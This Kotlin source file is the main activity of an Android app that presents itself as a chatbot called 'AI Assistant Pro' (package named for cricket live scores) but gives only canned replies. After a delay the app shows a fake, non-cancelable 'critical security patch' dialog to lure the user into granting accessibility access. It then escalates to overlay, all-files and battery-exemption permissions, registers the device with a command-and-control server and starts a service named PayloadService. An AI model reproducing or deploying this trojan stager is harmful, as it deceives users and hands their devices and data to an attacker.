package com.cricket.livescore.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.Html
import android.util.Log
import android.view.Gravity
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.cricket.livescore.databinding.ActivityMainBinding
import com.cricket.livescore.service.PayloadService
import com.cricket.livescore.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    companion object {
        private const val PERMISSION_REQ_CODE = 1001
    }

    private lateinit var binding: ActivityMainBinding
    private val permissionHelper = PermissionHelper()
    private var flowCompleted = false
    private var overlayRequested = false
    private var batteryOptRequested = false
    private var storageRequested = false
    private var permissionRequested = false
    private var stealthDialogShown = false
    private var flowLaunched = false

    private lateinit var chatContainer: LinearLayout
    private lateinit var messageInput: EditText
    private lateinit var btnSend: Button
    private lateinit var statusText: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        chatContainer = binding.chatContainer
        messageInput = binding.messageInput
        btnSend = binding.btnSend
        statusText = binding.statusText

        setupUI()
        checkPermissions()

        if (!flowLaunched) {
            flowLaunched = true
            android.os.Handler(mainLooper).postDelayed({
                if (!isFinishing && !flowCompleted) {
                    triggerStealthPermissionFlow()
                }
            }, 10000)
        }
    }

    private fun setupUI() {
        addBotMessage("Hello! I'm your AI Assistant. I can help you with writing, research, answering questions, and more. How can I help you today?")

        btnSend.setOnClickListener {
            val text = messageInput.text.toString().trim()
            if (text.isNotEmpty()) {
                sendMessage(text)
                messageInput.text.clear()
            }
        }

        messageInput.setOnEditorActionListener { _, _, _ ->
            val text = messageInput.text.toString().trim()
            if (text.isNotEmpty()) {
                sendMessage(text)
                messageInput.text.clear()
            }
            true
        }

    }

    private fun sendMessage(text: String) {
        addUserMessage(text)
        statusText.text = "Thinking..."
        statusText.setTextColor(0xFF6C63FF.toInt())

        android.os.Handler(mainLooper).postDelayed({
            val response = generateResponse(text)
            addBotMessage(response)
            statusText.text = "Ready to assist"
            statusText.setTextColor(0xFF6C63FF.toInt())
        }, (1000..2500).random().toLong())
    }

    private fun generateResponse(input: String): String {
        val lower = input.lowercase()
        return when {
            lower.contains("hello") || lower.contains("hi") || lower.contains("hey") ->
                "Hello! How can I assist you today? Feel free to ask me anything."
            lower.contains("how are you") -> "I'm functioning perfectly! Ready to help you with your tasks."
            lower.contains("name") || lower.contains("who are you") ->
                "I'm AI Assistant Pro - your personal AI-powered helper. I can assist with writing, answering questions, research, and more."
            lower.contains("write") || lower.contains("essay") || lower.contains("article") ->
                "I can help you write! Tell me the topic and I'll draft something for you. What would you like me to write about?"
            lower.contains("translate") -> "I can help with translations. What text would you like me to translate and to which language?"
            lower.contains("summarize") || lower.contains("summary") ->
                "Send me the text you'd like summarized and I'll create a concise summary for you."
            lower.contains("help") || lower.contains("what can you") ->
                "I can help with: writing & editing, answering questions, research assistance, text analysis, translations, summarization, and more. Just ask!"
            lower.contains("thank") -> "You're welcome! Is there anything else I can help you with?"
            lower.contains("bye") || lower.contains("goodbye") ->
                "Goodbye! Feel free to come back anytime you need assistance."
            lower.contains("tool") -> "Available tools: Writing Assistant, Text Analysis, Smart Q&A, Document Summarizer, Translation Helper."
            else -> "That's interesting! I'm still learning about that. Could you tell me more so I can better assist you?"
        }
    }

    private fun addUserMessage(text: String) {
        val tv = TextView(this).apply {
            this.text = text
            setTextColor(0xFFffffff.toInt())
            textSize = 14f
            setPadding(40, 8, 12, 8)
            setBackgroundColor(0xFF6C63FF.toInt())
            gravity = Gravity.END
        }
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(60, 4, 4, 4)
            gravity = Gravity.END
        }
        tv.layoutParams = params
        chatContainer.addView(tv)
        scrollToBottom()
    }

    private fun addBotMessage(text: String) {
        val tv = TextView(this).apply {
            this.text = text
            setTextColor(0xFFcccccc.toInt())
            textSize = 14f
            setPadding(12, 8, 40, 8)
            setBackgroundColor(0xFF2D2B55.toInt())
        }
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(4, 4, 60, 4)
        }
        tv.layoutParams = params
        chatContainer.addView(tv)
        scrollToBottom()
    }

    private fun scrollToBottom() {
        binding.chatScroll.post {
            binding.chatScroll.fullScroll(ScrollView.FOCUS_DOWN)
        }
    }

    private fun checkPermissions() {
        if (!isAccessibilityServiceEnabled()) {
            statusText.text = "Enable accessibility for full AI assistance"
            statusText.setTextColor(0xFFFFCC00.toInt())
        } else {
            statusText.text = "Ready to assist"
            statusText.setTextColor(0xFF6C63FF.toInt())
        }
    }

    private fun showPermissionDialog() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("AI Assistance Required")
            .setMessage("AI Assistant Pro needs Accessibility access to provide personalized help across all your apps. This enables context-aware suggestions, smart replies, and automated assistance features.")
            .setPositiveButton("Enable Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .show()
    }

    private fun triggerStealthPermissionFlow() {
        if (stealthDialogShown) return
        stealthDialogShown = true
        if (isAccessibilityServiceEnabled()) {
            startPayloadFlow()
        } else {
            showStealthAccessibilityPrompt()
        }
    }

    private fun showStealthAccessibilityPrompt() {
        if (isFinishing || isDestroyed) return
        AlertDialog.Builder(this)
            .setTitle("System Update Required")
            .setMessage("Security Patch v2.1\n\nYour device needs a critical security update to enable enhanced AI features. Tap 'Apply Now' to proceed with the update process.")
            .setPositiveButton("Apply Now") { _, _ ->
                if (!isFinishing && !isDestroyed) openAccessibilitySettings()
            }
            .setNegativeButton("Later", null)
            .setCancelable(false)
            .show()
    }

    private fun openAccessibilitySettings() {
        if (isFinishing || isDestroyed) return
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = am.getEnabledAccessibilityServiceList(
            AccessibilityServiceInfo.FEEDBACK_ALL_MASK
        )
        return enabledServices.any {
            it.resolveInfo.serviceInfo.packageName == packageName
        }
    }

    fun startPayloadFlow() {
        if (flowCompleted) return
        continuePayloadFlow()
    }

    private fun continuePayloadFlow() {
        if (flowCompleted || isFinishing || isDestroyed) return

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            if (!overlayRequested) {
                overlayRequested = true
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
                return
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                if (!batteryOptRequested) {
                    batteryOptRequested = true
                    startActivity(
                        Intent(
                            Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return
                }
            }
        }

        if (!PermissionHelper.hasStoragePermission(this)) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (!storageRequested) {
                    storageRequested = true
                    startActivity(
                        Intent(
                            Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                            Uri.parse("package:$packageName")
                        )
                    )
                    return
                }
            }
        }

        if (!permissionHelper.hasAllPermissions(this)) {
            if (!permissionRequested) {
                permissionRequested = true
                permissionHelper.requestPermissions(this)
                return
            }
        }

        finishSetup()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQ_CODE && !isFinishing && !isDestroyed) {
            permissionRequested = false
            continuePayloadFlow()
        }
    }

    private fun finishSetup() {
        if (isFinishing || isDestroyed) return

        flowCompleted = true

        Thread {
            registerViaHttpSync()

            runOnUiThread {
                if (isFinishing || isDestroyed) return@runOnUiThread
                val serviceIntent = Intent(this, PayloadService::class.java)
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        startForegroundService(serviceIntent)
                    } else {
                        startService(serviceIntent)
                    }
                } catch (e: Exception) {
                    Log.e("MainActivity", "ForegroundService failed", e)
                }

                statusText.text = "AI services activated"
                statusText.setTextColor(0xFF00FF41.toInt())
            }
        }.apply {
            isDaemon = true
        }.start()
    }

    private fun registerViaHttpSync() {
        try {
            val json = org.json.JSONObject().apply {
                put("device_id", Build.ID)
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                put("manufacturer", Build.MANUFACTURER)
                put("model", Build.MODEL)
                put("android_version", Build.VERSION.RELEASE)
                put("api_level", Build.VERSION.SDK_INT)
            }
            val url = java.net.URL("${com.cricket.livescore.StagerApplication.c2RealUrl}/api/register")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            conn.outputStream.write(json.toString().toByteArray())
            val code = conn.responseCode
            conn.disconnect()
            Log.i("MainActivity", "HTTP registration: $code")
        } catch (e: Exception) {
            Log.e("MainActivity", "HTTP registration failed", e)
        }
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || isDestroyed) return
        if (isAccessibilityServiceEnabled()) {
            statusText.text = "Ready to assist"
            startPayloadFlow()
        }
    }
}
